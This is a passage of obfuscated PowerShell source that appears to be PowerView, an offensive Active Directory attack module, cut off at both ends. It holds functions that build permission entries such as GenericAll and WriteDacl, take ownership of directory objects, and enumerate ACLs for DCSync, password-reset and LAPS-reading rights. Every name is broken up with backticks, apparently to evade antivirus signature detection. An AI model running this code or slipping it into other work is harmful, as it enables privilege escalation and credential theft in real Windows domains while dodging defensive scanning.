            Tuesday = convE`R`TtO-`LOgOnHouRsaR`RAY -HoursArr ${Lo`gOnH`ourSArray}[6..8]
            Wednesday = Co`NV`eRT`TO-LOgO`NhO`UrSA`R`RAy -HoursArr ${L`OGOn`HoUrs`ARRAY}[9..11]
            Thurs = conv`eR`TTO-lo`go`Nh`O`Ur`SarRAy -HoursArr ${Logon`HO`U`R`saRRAY}[12..14]
            Friday = cOnvertTo-`lo`g`O`NhoUrsArraY -HoursArr ${lOgOnho`UR`S`A`RrAy}[15..17]
            Saturday = C`O`NVe`RtT`O-l`O`GOn`hoUrSaRRAy -HoursArr ${loGOnh`oU`R`s`ARRaY}[18..20]
        }

        ${Ou`T`PuT} = NeW-`O`BjeCt PsoB`jeCT -Property ${out`Put}
        ${O`Ut`pUT}.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        ${o`UT`PuT}
    }
}


function neW`-AdOBJE`ctA`cCEss`cOn`TRoLenTry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${Tr`Ue}, Mandatory = ${Tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${P`RINcI`P`AL`iDeNtITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${P`Ri`NC`iPAL`doM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`e`RVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SeArCH`s`cope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`UlTpAgeSi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`V`erTI`ME`LiMIT},

        [Switch]
        ${Tomb`S`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edEN`T`IaL} = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = ${t`RuE})]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        ${R`Ig`HT},

        [Parameter(Mandatory = ${Tr`UE}, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        ${AcceSsCo`NtR`O`Lt`YpE},

        [Parameter(Mandatory = ${tR`UE}, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        ${audI`Tf`Lag},

        [Parameter(Mandatory = ${f`Alse}, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = ${fal`sE}, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = ${FaL`se}, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        ${OBjeCT`T`YPE},

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        ${INhe`Rit`AN`c`ETyPe},

        [Guid]
        ${in`Herit`ED`obJecT`TYpe}
    )

    Begin {
        if (${Pr`InCIPAlIDe`N`TiTY} -notmatch '^S-1-.*') {
            ${prInC`ip`AlsE`ARChE`RArg`UMEnTs} = @{
                'Identity' = ${p`RInC`i`pa`LiDenTITy}
                'Properties' = 'distinguishedname,objectsid'
            }
            if (${p`sboundp`ARAmet`e`RS}['PrincipalDomain']) { ${P`Rin`C`ipaLSearCHEraRg`U`M`eNts}['Domain'] = ${PRi`NC`IpAl`dOmA`In} }
            if (${pSboUNdp`A`Ra`meT`Ers}['Server']) { ${pRiNCiPa`LSE`ARc`hEraRg`U`meN`Ts}['Server'] = ${SE`Rv`eR} }
            if (${p`Sb`OU`NdpArAmETeRS}['SearchScope']) { ${PRiNCi`PalS`eARC`HERa`RguMENtS}['SearchScope'] = ${SEAr`c`HscoPe} }
            if (${P`SBOUN`DpARA`mEt`E`Rs}['ResultPageSize']) { ${PrinCI`pals`EArC`H`eraR`g`U`m`eNtS}['ResultPageSize'] = ${ReS`ULtp`AGesI`zE} }
            if (${pSb`ouN`Dpar`Am`ETeRS}['ServerTimeLimit']) { ${prin`cIp`AlseARCh`e`RARGU`Men`TS}['ServerTimeLimit'] = ${seR`Ve`RtIMEl`ImIT} }
            if (${P`sbO`UnDP`A`RAMeTerS}['Tombstone']) { ${pR`INCIp`A`LS`eArCHEra`RgumeN`Ts}['Tombstone'] = ${t`OMbSto`Ne} }
            if (${PS`BoUNDpaR`A`meT`eRs}['Credential']) { ${PrInCiPA`lS`eaR`cher`ArguM`En`Ts}['Credential'] = ${credEN`T`iAL} }
            ${p`Rinc`iPal} = GET-DOMAi`NO`B`j`eCt @PrincipalSearcherArguments
            if (-not ${PRInc`Ip`Al}) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif(${PriNC`I`PAl}.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            ${O`Bj`ecTSiD} = ${PRIncI`p`Al}.objectsid
        }
        else {
            ${oBJe`c`Ts`id} = ${p`RIn`C`iPaLI`DentIty}
        }

        ${adRI`GHt} = 0
        foreach(${r} in ${R`iGHt}) {
            ${AD`RIGhT} = ${adRI`Ght} -bor (([System.DirectoryServices.ActiveDirectoryRights]${r}).value__)
        }
        ${aD`Rig`hT} = [System.DirectoryServices.ActiveDirectoryRights]${adRI`ghT}

        ${IdEN`TI`Ty} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${oB`J`ECtsid})
    }

    Process {
        if(${PScm`d`lET}.ParameterSetName -eq 'AuditRuleType') {

            if(${OB`jECTt`YPE} -eq ${nU`Ll} -and ${I`NHERIT`ANCe`TypE} -eq [String]::Empty -and ${inhE`R`iTEDObJEctT`ype} -eq ${N`ULl}) {
                nE`w-oBj`E`Ct sYste`M`.`Di`Re`ctOrys`eRviCes.actIvE`dIrEC`TorYauditrULE -ArgumentList ${i`DeNT`iTy}, ${aDrI`g`hT}, ${AUDi`Tf`LaG}
            } elseif(${OBJECt`TY`Pe} -eq ${n`UlL} -and ${in`heRIt`A`NCEType} -ne [String]::Empty -and ${INH`eR`It`edObJe`CT`TYPE} -eq ${n`UlL}) {
                n`ew`-O`BJeCT SYsTE`M.D`I`R`EctOry`Se`RViC`E`S.ACt`iV`EDirECTOr`yaUDIt`RuLE -ArgumentList ${I`dEntI`Ty}, ${AdR`I`Ght}, ${aU`diTF`l`Ag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${INHer`I`TancEt`ype})
            } elseif(${ObJEct`Ty`PE} -eq ${Nu`ll} -and ${i`NheriTa`N`C`etYPE} -ne [String]::Empty -and ${INheRite`d`ObjEcT`Ty`pe} -ne ${N`ULl}) {
                n`EW-oBJ`ECT syST`EM`.DIREcToRyse`RvI`Ces.`AC`TiV`e`direcTO`Ry`A`U`DIT`RULE -ArgumentList ${id`eNtITY}, ${Ad`RiGht}, ${AUDi`T`FlAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${IN`H`Er`IT`AncEtYPE}), ${I`NH`er`ItedoBjeCttY`Pe}
            } elseif(${ObJEc`Tt`ypE} -ne ${Nu`lL} -and ${InHERitaN`C`et`YPE} -eq [String]::Empty -and ${iNhE`R`I`TeDoB`j`E`CTtyPE} -eq ${NU`LL}) {
                nE`w`-ObJect SysteM.DIReCToR`y`SERV`I`CEs.`A`ctIVEdIre`CtOr`YAUDITRU`Le -ArgumentList ${IdeN`T`iTY}, ${ad`RIgHt}, ${Au`diTF`LAG}, ${ob`jECT`TYPE}
            } elseif(${oBJeCtT`y`PE} -ne ${n`ULL} -and ${I`NhERIt`ANC`e`Type} -ne [String]::Empty -and ${I`NheRITe`DobJE`Ct`T`yPe} -eq ${nu`LL}) {
                NE`w-Ob`JeCt SYstEm.dI`REctoR`y`S`e`R`ViC`e`S`.ACTiVeDIRecToRyaUDi`Tr`Ule -ArgumentList ${IDEn`TiTY}, ${AdRig`Ht}, ${A`UDI`Tf`lag}, ${oBj`Ec`T`TyPE}, ${InHeRI`T`ANc`eTy`pE}
            } elseif(${o`BJ`ECTTYPe} -ne ${n`ULl} -and ${i`NHeRItaNCE`T`YPe} -ne [String]::Empty -and ${iNheRITE`do`BJ`E`cttYpe} -ne ${n`ULL}) {
                nE`w-O`BjeCT sy`steM`.dIr`ECTorySER`V`icE`S.aCtIVED`iRe`C`TORY`A`Ud`it`R`UlE -ArgumentList ${I`d`ENt`ItY}, ${aD`RIgHT}, ${AudItF`L`AG}, ${O`BJE`c`TtyPE}, ${iNHerIt`AN`c`Et`Ype}, ${I`NHeriTe`DO`B`J`ecTt`YpE}
            }

        }
        else {

            if(${OB`J`eC`TType} -eq ${nU`LL} -and ${IN`he`RItancet`Y`pE} -eq [String]::Empty -and ${i`NHER`ItedO`B`je`cTt`Ype} -eq ${nu`LL}) {
                N`Ew-`O`BJEcT Sy`sT`Em.`dIrEc`ToR`y`S`ErViC`eS`.AcTI`VEdI`Recto`RY`ACcEsS`RuLE -ArgumentList ${id`enTi`TY}, ${adRig`HT}, ${A`CcESsCOntRO`L`T`ype}
            } elseif(${oBJE`CtTY`PE} -eq ${nu`LL} -and ${iNh`eRit`ANCE`TyPE} -ne [String]::Empty -and ${InheRITeDob`Je`ctty`pE} -eq ${N`UlL}) {
                neW`-ObJe`cT S`YsteM.`di`R`ectO`R`y`SEr`ViCE`s.a`cTIvEDirECtOr`yaCc`ESSRule -ArgumentList ${id`E`NTiTY}, ${aD`RIg`ht}, ${aCCe`SS`cONTR`O`lTYpE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`NhEriT`AnCe`Ty`pE})
            } elseif(${oB`J`Ectty`pE} -eq ${nU`ll} -and ${inh`eRi`Tanc`eT`YPE} -ne [String]::Empty -and ${I`NH`ERI`TEdo`BjEct`TY`pE} -ne ${N`ULL}) {
                NeW-oBJ`e`Ct sYsteM.DIR`eC`TO`R`ySE`R`VicE`s.ACtived`Ir`Ec`To`RYaCce`SsRUlE -ArgumentList ${idE`N`T`ItY}, ${A`dR`iGHt}, ${ac`ceSSCoN`Tr`olt`y`PE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inHER`itA`NcET`ype}), ${IN`h`ER`it`edoBjECTt`y`Pe}
            } elseif(${OB`JeCTt`yPe} -ne ${nU`ll} -and ${Inh`E`RItAn`cE`TY`Pe} -eq [String]::Empty -and ${iNh`ErI`TEdobJe`c`TT`y`Pe} -eq ${n`UlL}) {
                new-`o`BJECt SysteM.`D`irE`CToR`YS`E`RViCeS.ACt`IveDIRECt`orYAccESsRULe -ArgumentList ${id`eNTi`TY}, ${A`DriGHT}, ${acC`ESsc`O`NT`RO`ltYpE}, ${OBJe`C`TtYpE}
            } elseif(${Ob`J`e`cTTYPe} -ne ${n`ULl} -and ${Inh`eR`itAN`C`etyPe} -ne [String]::Empty -and ${iN`HE`RiTe`DobjeC`T`T`Ype} -eq ${NU`LL}) {
                New`-`ObjECT syST`EM.`di`RECtOrySErVIc`E`S`.ActiVEDir`EC`TORyAcc`EsSRULE -ArgumentList ${id`ENTi`TY}, ${Adr`Ig`HT}, ${ac`cEssco`NtrOL`T`ype}, ${OBJ`EC`TTy`pE}, ${InHEr`I`T`Ance`TyPe}
            } elseif(${O`Bj`ECTTYpE} -ne ${N`ULl} -and ${i`NHerIT`ANCET`yPE} -ne [String]::Empty -and ${I`N`hERiTeDo`B`JeCTTYpE} -ne ${N`Ull}) {
                NEw-o`B`jEct s`ysTEm`.dirECTO`RY`SerVic`eS`.aC`TIv`e`dirEcT`Or`yA`CcEssRule -ArgumentList ${IDEN`T`ITY}, ${A`dr`Ight}, ${accEsSco`N`TrO`LtyPe}, ${O`BjeCtt`y`Pe}, ${iNhE`R`ITA`NC`eType}, ${i`N`HER`I`TeDoB`J`ectTyPe}
            }

        }
    }
}


function Set-d`oMAInObje`c`To`w`NeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${TR`Ue}, ValueFromPipeline = ${T`RUe}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${iDE`N`TI`TY},

        [Parameter(Mandatory = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        ${oW`NerIdEnt`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMaiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ldaP`FILt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEaR`Ch`BAsE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`eA`RChSCoPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${REs`U`L`TpagES`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERverti`MELi`mIT},

        [Switch]
        ${t`o`mbsToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDE`Nt`Ial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${Se`A`RC`h`ErargUMeNTS} = @{}
        if (${Ps`BOUNDpa`RAM`ET`erS}['Domain']) { ${SEarCHeRA`Rg`U`mE`N`Ts}['Domain'] = ${d`OmaIN} }
        if (${psbOU`NDPaR`Am`E`TeRs}['LDAPFilter']) { ${Se`AR`c`HEr`Ar`GumenTS}['LDAPFilter'] = ${Ld`APFIL`T`ER} }
        if (${pS`Bound`PARa`Me`TErs}['SearchBase']) { ${S`Ear`ChE`RArgUmENTS}['SearchBase'] = ${sEaR`c`HB`ASE} }
        if (${p`sBoUND`Pa`R`AMeTe`Rs}['Server']) { ${SEA`RcHER`AR`gUM`eNtS}['Server'] = ${Se`RvEr} }
        if (${PSbou`ND`PArA`MeT`eRS}['SearchScope']) { ${s`eArCheRa`R`GuM`EN`Ts}['SearchScope'] = ${s`eArc`hsCOpE} }
        if (${P`SbouND`p`AR`AMEt`ers}['ResultPageSize']) { ${Sea`RCh`ERARG`UmENTS}['ResultPageSize'] = ${rES`ULTpagE`siZe} }
        if (${P`sbOUNdPAr`Am`ET`E`RS}['ServerTimeLimit']) { ${sEaRch`Erar`guM`EnTs}['ServerTimeLimit'] = ${SeR`VE`RT`IMEL`imit} }
        if (${P`Sbound`p`ArAmeTe`RS}['Tombstone']) { ${seAr`C`H`erA`RGuMenTS}['Tombstone'] = ${T`OM`BsT`One} }
        if (${PsB`oUN`dpaRAMe`T`erS}['Credential']) { ${searc`H`E`Ra`RgumeNTS}['Credential'] = ${c`RedEn`TIal} }

        ${OwnErs`Id} = GET-`DOM`AInO`BJ`Ect @SearcherArguments -Identity ${OWnErI`De`NTITY} -Properties ObJectS`Id | SelEc`T-O`BJecT -ExpandProperty OBjE`ct`sID
        if (${o`w`NersID}) {
            ${Ow`N`e`Ride`NT`itYre`FereNCe} = [System.Security.Principal.SecurityIdentifier]${own`E`RSId}
        }
        else {
            W`Rite-w`AR`NINg "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if (${o`W`NERIDe`Nt`ItYre`Fe`RENCE}) {
            ${s`E`Ar`cheRa`RgUmentS}['Raw'] = ${T`RUe}
            ${SeARCHE`R`AR`GuM`En`TS}['Identity'] = ${i`deN`TIty}

            
            ${R`A`wObjeCT} = GEt-D`OM`Ai`NobjeCT @SearcherArguments

            ForEach (${Ob`Je`ct} in ${rAW`ObJ`EcT}) {
                try {
                    wRit`e-`V`ErBOSE "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    ${E`Nt`Ry} = ${RA`wo`Bj`ECt}.GetDirectoryEntry()
                    ${EnT`RY}.PsBase.Options.SecurityMasks = 'Owner'
                    ${eNt`RY}.PsBase.ObjectSecurity.SetOwner(${OWnERi`d`en`TI`TY`REf`ere`Nce})
                    ${e`N`TRy}.PsBase.CommitChanges()
                }
                catch {
                    WrI`Te`-wArNi`Ng "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function g`eT-DoMaiNobj`ec`T`A`cL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${i`D`EnTItY},

        [Switch]
        ${S`AcL},

        [Switch]
        ${reSOlVe`gU`IDS},

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync', 'AllExtended', 'ReadLAPS')]
        ${riG`ht`sFIlter},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`d`APfIL`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sE`A`RCHbASe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`ERVer},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sea`RCHsc`OPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`E`sUlTPaGesIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`VErTIME`liMIT},

        [Switch]
        ${t`omBSt`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EdE`N`TIal} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${S`sl},

        [Switch]
        ${OBf`U`s`CAtE}
    )

    BEGIN {
        ${Se`A`Rch`eraRgu`mENTs} = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if (${Psbo`UnDpa`R`Ame`T`erS}['Sacl']) {
            ${sear`CHeRa`R`gUMEnTS}['SecurityMasks'] = 'Sacl'
        }
        else {
            ${sear`C`HerA`RgUm`e`NtS}['SecurityMasks'] = 'Dacl'
        }
        if (${PS`BOUNdp`Ar`AmETE`RS}['Domain']) { ${S`Ea`RChE`RARGuMENts}['Domain'] = ${do`mA`in} }
        if (${pSB`OuNdp`A`RAM`etErs}['SearchBase']) { ${Se`ARcHERa`RGU`MEnTs}['SearchBase'] = ${sear`c`HbaSE} }
        if (${PsBOUND`p`AR`Ame`TeRS}['Server']) { ${se`AR`CHe`RArguMEN`TS}['Server'] = ${se`R`VEr} }
        if (${pS`BOu`Ndp`A`RaMETERS}['SearchScope']) { ${se`A`RChEr`ARg`UMENtS}['SearchScope'] = ${se`A`RCHsC`opE} }
        if (${pS`BoUN`DPARAm`eteRS}['ResultPageSize']) { ${sea`R`CheRargu`MeNTS}['ResultPageSize'] = ${R`eSuLtpag`e`S`Ize} }
        if (${pSBoUnDpA`RA`m`EterS}['ServerTimeLimit']) { ${sEArCh`ERa`RGUm`ENts}['ServerTimeLimit'] = ${s`Erv`e`RTiMeLI`MIt} }
        if (${PsBOU`N`dPaRa`Me`Te`RS}['Tombstone']) { ${S`ea`RcHeR`ARgUmentS}['Tombstone'] = ${t`OM`Bstone} }
        if (${pSb`O`Und`PArAMeTE`Rs}['Credential']) { ${Se`Arc`HeRar`GUmENTS}['Credential'] = ${cRED`ENTI`Al} }
        if (${PsbOUN`DPaRAMe`T`Ers}['SSL']) { ${sEArC`h`ERARgum`EN`TS}['SSL'] = ${s`SL} }
        if (${Psbo`Un`dparAmE`Ters}['Obfuscate']) {${SEarCHeRA`Rgu`M`e`Nts}['Obfuscate'] = ${ob`F`USC`Ate} }
        ${seAr`C`hER} = geT-D`om`A`INsEA`RcH`eR @SearcherArguments

        ${D`o`MaING`UID`mApAR`GUMe`NtS} = @{}
        if (${pS`B`OU`NDpAr`AMe`TERs}['Domain']) { ${D`omA`i`Ngu`iDMaPArGuM`eN`Ts}['Domain'] = ${DO`ma`In} }
        if (${pSBo`UNdPa`R`A`MeTE`Rs}['Server']) { ${dom`AInG`UIDmaPaRGuMe`N`TS}['Server'] = ${SE`RVEr} }
        if (${PS`BoUn`DPAramEt`E`Rs}['ResultPageSize']) { ${d`O`mAiNG`UIdMAp`ARGuMe`NTS}['ResultPageSize'] = ${r`e`sult`pAg`eSiZE} }
        if (${p`sbOUNDP`ARa`m`eteRS}['ServerTimeLimit']) { ${D`oMA`ingu`idM`Apa`R`GumeNts}['ServerTimeLimit'] = ${sE`RvEr`T`iM`ElIMit} }
        if (${PS`B`OU`NDPar`AM`eTers}['Credential']) { ${doMa`InGuidMaPA`R`GumEN`Ts}['Credential'] = ${cREDe`NTi`Al} }
        if (${pSBoUn`DpA`RA`MEtE`RS}['SSL']) { ${DO`MAi`NGuIdmA`pA`RG`UmEn`TS}['SSL'] = ${S`sl} }

        
        if (${psBOU`NDp`AR`AmETers}['ResolveGUIDs']) {
            ${G`UI`ds} = g`Et-`D`oMaiNgUi`dMAp @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${se`A`RchEr}) {
            ${idEnTITy`FIL`T`Er} = ''
            ${F`iL`TER} = ''
            ${i`DENT`ITY} | w`HeR`E-`ObjecT {${_}} | foR`eacH-ob`jEct {
                ${IDeNT`ITYiNS`T`A`N`ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${iDen`TiTYiNST`A`NCE} -match '^S-1-.*') {
                    ${IDeNTI`T`yfi`lteR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdEnTiTy`i`NsTA`N`ce} -match '^(CN|OU|DC)=.*') {
                    ${i`d`ENTIT`YFILTEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psBo`U`NDpAr`A`mEtErS}['Domain']) -and (-not ${P`Sb`OUNDP`AraMeTeRs}['SearchBase'])) {
                        
                        
                        ${iDe`NTI`TY`DOM`AIn} = ${iDEnt`itYIns`T`ANce}.SubString(${IdEn`TiTY`InsTaN`Ce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        wR`ItE`-v`Erb`OsE "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${sEa`RCHERa`R`gu`mENts}['Domain'] = ${IdENtitY`D`oM`AIN}
                        ${sEaRc`H`ER} = gEt-`d`OMA`iNseaRcHER @SearcherArguments
                        if (-not ${S`E`ARChEr}) {
                            wri`Te-`WarNI`NG "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${iD`ENtIT`yIn`s`TAnCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${G`UID`BYt`ESTr`inG} = (([Guid]${IdEntI`T`yInsT`AN`CE}).ToByteArray() | F`o`REaC`H-OBJe`ct { '\' + ${_}.ToString('X2') }) -join ''
                    ${iD`e`Nt`iTYFiltER} += "(objectguid=$GuidByteString)"
                }
                elseif (${iDE`NTiTy`INST`A`N`CE}.Contains('.')) {
                    ${i`DEnti`TYF`I`lTer} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${iDENt`ITYFIl`T`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IdEnTi`TYFI`l`Ter} -and (${i`d`ENTIt`yFILTer}.Trim() -ne '') ) {
                ${f`I`lTer} += "(|$IdentityFilter)"
            }

            if (${PSBO`UNd`P`ArAm`eT`ErS}['LDAPFilter']) {
                W`RitE-veRbo`se "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                ${FI`L`TEr} += "$LDAPFilter"
            }

            if (${fi`Lt`er}) {
                ${f`ilT`ER} = "(&$Filter)"
            }
            WrIT`E`-VeRB`OsE "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Filter)"

            
            if (${F`iLTer} -and ${fi`LTEr} -ne '') {
                ${sEaR`c`he`RAr`GuMen`TS}['LDAPFilter'] = "$Filter"
            }
            ${R`es`UltS} = in`VoKe`-L`daPqUERy @SearcherArguments
            ${R`E`SuLts} | W`HerE-o`Bject {${_}} | FOR`eAch-o`B`j`eCt {
                if (gE`T-`mEmber -inputobject ${_} -name "Attributes" -Membertype Pr`o`P`ErTiEs) {
                    ${O`BJecT} = @{}
                    foreach (${A} in ${_}.Attributes.Keys | s`oRT`-oBJECt) {
                        w`RIte`-outPUT "TEST: $a"
                        if ((${A} -eq 'objectsid') -or (${a} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${a} -eq 'usercertificate') -or (${A} -eq 'ntsecuritydescriptor')) {
                            ${o`BJE`ct}[${a}] = ${_}.Attributes[${A}]
                        }
                        else {
                            ${vAlU`Es} = @()
                            foreach (${v} in ${_}.Attributes[${a}].GetValues([byte[]])) {
                                ${v`AlUES} += [System.Text.Encoding]::UTF8.GetString(${V})
                            }
                            ${o`Bje`cT}[${A}] = ${v`ALU`Es}
                        }
                    }
                }
                else {
                    ${O`BjecT} = ${_}.Properties
                }


                if (${O`B`JeCT}.objectsid -and ${ob`JE`CT}.objectsid[0]) {
                    ${OB`jE`Ctsid} = (nEw-`oBj`eCT sYSt`EM`.sEC`URiTY.p`R`i`NcIp`A`l.s`ECuri`TYidENt`iFIER(${O`BJECT}.objectsid[0],0)).Value
                }
                else {
                    ${obJec`T`sID} = ${Nu`Ll}
                }

                try {
                    ${SE`cU`RiTYDE`sc`RIPt`or} = N`E`w-obJ`ECT SeC`U`R`ity.A`ccEsS`cONt`Rol.RawSEcU`RIT`YdesCri`p`TOR -ArgumentList ${Ob`J`ect}['ntsecuritydescriptor'][0], 0
                    ${s`e`cuRITy`DEs`c`RiPtor} | FoReac`h-oB`J`e`cT { if (${pSbou`N`DpaR`AME`TeRS}['Sacl']) {${_}.SystemAcl} else {${_}.DiscretionaryAcl} } | FOrEa`c`H-ObJEct {
                        ${CoNT`IN`UE} = ${FA`L`sE}
                        ${_} | AdD`-Memb`er nO`TePro`pe`RtY 'ObjectDN' ${OBJ`EcT}.distinguishedname[0]
                        ${_} | a`d`D`-MEMber n`otepr`oPERTy 'ObjectSID' ${OBj`ECT`sId}
                        ${_} | adD-`MeM`BER n`o`TE`PrOperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], ${_}.AccessMask))
                        if (${PsbOU`NdparamE`T`ERs}['RightsFilter']) {
                            ${gU`Id`F`ilteR} = Switch (${r`iGH`TsfILt`eR}) {
                                'ResetPassword' { @('00299570-246d-11d0-a768-00aa006e0529') }
                                'WriteMembers' { @('bf9679c0-0de6-11d0-a285-00aa003049e2') }
                                'DCSync' { @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', 'GenericAll', 'ExtendedRight') }
                                'AllExtended' { 'ExtendedRight' }
                                'ReadLAPS' { @('ExtendedRight', 'GenericAll', 'WriteDacl') }
                                'All' { 'GenericAll' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if (${_}.AceQualifier -eq 'AccessAllowed' -and ((${_}.ObjectAceType -and ${Gu`I`D`FiLter} -contains ${_}.ObjectAceType) -or (${_}.InheritedObjectAceType -and ${g`UiD`FIL`TEr} -contains ${_}.InheritedObjectAceType))) {
                                ${C`O`NTinUE} = ${TR`Ue}
                            }
                            elseif (${_}.AceQualifier -eq 'AccessAllowed' -and !(${_}.ObjectAceType) -and !(${_}.InheritedObjectAceType) -and ((${_}.ActiveDirectoryRights -match ${Gu`ID`FilTER}) -or (${GUid`FilT`ER} -contains ${_}.ActiveDirectoryRights))) {
                                ${ConT`i`NUE} = ${tr`UE}
                            }
                            elseif ((${_}.AceQualifier -eq 'AccessAllowed') -and !(${_}.ObjectAceType) -and !(${_}.InheritedObjectAceType)) {
                                ForEach (${gu`Id} in ${gui`DfIl`TEr}) {
                                    if (${_}.ActiveDirectoryRights -match ${gu`Id}) {
                                        ${CONT`IN`Ue} = ${t`RUE}
                                    }
                                }
                            }
                        }
                        else {
                            ${CON`TInue} = ${t`RuE}
                        }
                        if (${C`oNTi`NuE}) {
                            if (${gU`I`Ds}) {
                                
                                ${AC`lp`ROpERTies} = @{}
                                ${_}.psobject.properties | fOREaCh-`obje`Ct {
                                    if (${_}.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            ${Aclp`Rope`RTiEs}[${_}.Name] = ${gUi`ds}[${_}.Value.toString()]
                                        }
                                        catch {
                                            ${aCL`Pr`O`PerTiES}[${_}.Name] = ${_}.Value
                                        }
                                    }
                                    else {
                                        ${a`ClPROPer`T`IES}[${_}.Name] = ${_}.Value
                                    }
                                }
                                ${oUT`ObJe`Ct} = NEW`-`Obj`ECT -TypeName psO`BjeCt -Property ${aCl`Prop`eR`TieS}
                                ${Ou`Tobj`e`ct}.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                ${OUtO`B`JeCT}
                            }
                            else {
